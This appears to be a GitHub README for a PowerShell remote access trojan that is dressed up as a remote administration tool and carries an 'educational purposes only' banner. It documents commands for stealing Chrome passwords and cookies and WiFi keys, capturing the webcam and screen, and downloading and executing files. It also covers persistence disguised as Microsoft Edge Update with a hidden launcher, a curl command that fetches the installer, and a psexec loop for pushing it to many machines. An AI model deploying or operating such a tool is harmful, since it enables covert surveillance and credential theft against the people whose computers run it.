




# Educational propourses ONLY!











# Remote System Administration Tool

A lightweight, professional remote administration framework for Windows systems management and monitoring.

## 📋 Overview

This tool provides system administrators with comprehensive remote management capabilities for Windows workstations. It enables real-time monitoring, system diagnostics, and remote administration through a secure WebSocket connection.

## ✨ Features

### System Management
- **Real-time System Information** - CPU, RAM, GPU, disk usage, network details
- **Process Management** - View, monitor, and terminate processes
- **Remote Command Execution** - Execute PowerShell commands remotely
- **Startup Persistence** - Optional auto-start configuration

### Monitoring & Surveillance
- **Screen Capture** - Take screenshots on demand
- **Webcam Access** - Capture images from connected cameras
- **Network Analysis** - View active connections, open ports, ARP tables

### Data Collection
- **WiFi Credentials** - Export saved wireless network passwords
- **Browser Data** - Extract saved credentials and cookies (Chrome)
- **Network Information** - IP addresses, MAC addresses, adapter details

### Audio & Media Control
- **Volume Management** - Adjust system volume remotely
- **Text-to-Speech** - Send voice messages to endpoints
- **Audio Playback** - Play audio files from URL

### System Control
- **Power Management** - Schedule shutdown, restart, or cancel
- **Display Control** - Flip screen, create visual effects
- **Input Control** - Manage mouse/keyboard temporarily
- **Notifications** - Send Windows toast notifications

### File Operations
- **File Transfer** - Upload/download files to/from endpoints
- **Remote Execution** - Download and execute files with arguments

## 🚀 Quick Start

### Prerequisites
- Windows 7/8/10/11
- PowerShell 5.1 or higher
- Active internet connection

### Installation

1. **Download the installer:**
```bash
curl -O https://raw.githubusercontent.com/icyyboy/wss-test-/main/setup.bat
Dont run the setup just test the file in a safe envoirement.


setup.bat
The installer will:

Download required components
Configure auto-start (optional)
Establish connection to management server
Clean up installation files
Server Configuration
The WebSocket server URL is stored in the url file on GitHub:

text

wss://your-server.com:port
Update this file to point to your management server.

📡 Architecture
text

Client (Windows PC)
    ↓
PowerShell Agent (updater.ps1)
    ↓
WebSocket Connection
    ↓
Management Server
    ↓
Admin Dashboard
Component Overview
Component	Location	Purpose
setup.bat	Installer	Initial deployment script
updater.ps1	%APPDATA%\Microsoft\EdgeUpdate\	Main agent
launcher.vbs	%APPDATA%\Microsoft\EdgeUpdate\	Silent launcher
url	GitHub	Server configuration
🎮 Command Reference
System Commands
text

/info                    - Get full system information
/exec <command>          - Execute PowerShell command
/processes               - List running processes
/kill <pid>              - Terminate process by PID
/persist on/off          - Toggle auto-start
/shutdown <action> [sec] - Shutdown/restart system
/logout                  - Lock workstation
Monitoring Commands
text

/ss                      - Capture screenshot
/webcam                  - Capture webcam photo
/netinfo                 - Network adapter information
/ports                   - Show open listening ports
/arp                     - Display ARP table
Data Extraction
text

/wifi                    - Export WiFi passwords
/passwords               - Chrome saved credentials
/cookies                 - Export Chrome cookies
Media & Control
text

/volume <0-100>          - Set system volume
/volume get              - Get current volume
/tts <text>              - Text-to-speech
/play <url>              - Play audio file
/msg <text>              - Show message box
Advanced Commands
text

/hidemouse               - Hide mouse cursor
/showmouse               - Show mouse cursor
/flip                    - Rotate display 180°
/shake                   - Shake active window
/glitch                  - Screen glitch effect
/toast <title> <msg>     - Windows toast notification
/dlexec <url>            - Download and execute file
File Operations
text

/download <url> <path>   - Download file to system
/upload <path>           - Upload file (returns base64)
🎯 Targeting System
Single Client
text

#COMPUTERNAME-USERNAME /command
Example:

text

#DESKTOP-ABC-John /ss
Broadcast (All Clients)
text

/command
Response Format
All responses are tagged:

text

[UID] response_data
🔧 Configuration
Auto-Start Persistence
The agent automatically configures startup persistence on first run:

Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Value Name: MicrosoftEdgeUpdate
Launch Method: VBScript launcher (invisible)
File Locations
text

%APPDATA%\Microsoft\EdgeUpdate\
├── updater.ps1      # Main PowerShell agent
└── launcher.vbs     # Invisible launcher script
🧹 Uninstallation
Automatic Cleanup
Run the cleanup script:

cmd

cleanup.bat
Manual Removal
Remove startup entry:
cmd

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MicrosoftEdgeUpdate /f
Delete files:
cmd

rmdir /s /q "%APPDATA%\Microsoft\EdgeUpdate"
Clear temp files:
cmd

del /q "%TEMP%\wc_*.*"
del /q "%TEMP%\audio_*.*"
🔐 Security Considerations
Agent Security
Runs with user-level privileges (no admin required)
Encrypted WebSocket (WSS) communication
No persistence without explicit command
Self-deletion capability (/selfdestruct)
Network Security
Update server URL via GitHub (change url file)
WebSocket authentication recommended
TLS/SSL encryption required
Best Practices
Use strong WSS authentication
Restrict GitHub repo access
Monitor connection logs
Implement rate limiting on server
Use VPN or private network when possible
📊 Dashboard Integration
Connection Message Format
text

UID:COMPUTERNAME-USERNAME CONNECTED | IP: X.X.X.X | Persist: true/false
Response Parsing
JavaScript

const match = message.match(/^\[(.+?)\] (.+)$/s);
if (match) {
    const uid = match[1];      // "DESKTOP-ABC-John"
    const response = match[2]; // Actual data
}
Base64 Image Handling
JavaScript

if (response.length > 1000 && !response.includes(' ')) {
    // Likely screenshot/webcam
    const imgSrc = 'data:image/png;base64,' + response;
}
🛠️ Development
Requirements
PowerShell 5.1+
.NET Framework 4.5+
Windows Management Framework
Testing
PowerShell

# Test WebSocket connection
Test-NetConnection -ComputerName your-server.com -Port 443

# Validate script syntax
powershell -NoProfile -File updater.ps1 -SyntaxOnly

# Debug mode
powershell -ExecutionPolicy Bypass -File updater.ps1
📝 Repository Structure
text

wss-test-/
├── rat.ps1           # Main PowerShell agent
├── url               # WebSocket server URL
├── setup.bat         # Installation script
├── cleanup.bat       # Uninstaller
└── README.md         # This file
🤝 Contributing
This is a private administrative tool. Contributions are limited to authorized personnel.

Reporting Issues
Use GitHub Issues for bug reports
Include system information (OS, PS version)
Provide error messages and logs
📜 License
Proprietary - Internal Use Only

⚙️ Advanced Usage
Custom WSS Server
Update the url file in the repository:

text

wss://your-custom-server.com:8080/endpoint
Multiple Endpoints
Deploy to multiple systems:

batch

for /f %%i in (targets.txt) do (
    copy setup.bat \\%%i\C$\Users\Public\
    psexec \\%%i C:\Users\Public\setup.bat
)
Persistent Deployment
Add to Group Policy startup scripts or deploy via MDM solution.

🔍 Troubleshooting
Agent Not Connecting
Check internet connectivity
Verify WebSocket URL in url file
Check firewall rules (port 443/8080)
Review PowerShell execution policy
Persistence Not Working
Check registry key exists
Verify VBS file in AppData
Test manual execution: wscript launcher.vbs
Commands Not Executing
Verify UID format matches
Check command syntax
Review response for error messages
Version: 1.0.0
Last Updated: 2024
Maintainer: icyyboy
Support: GitHub Issues
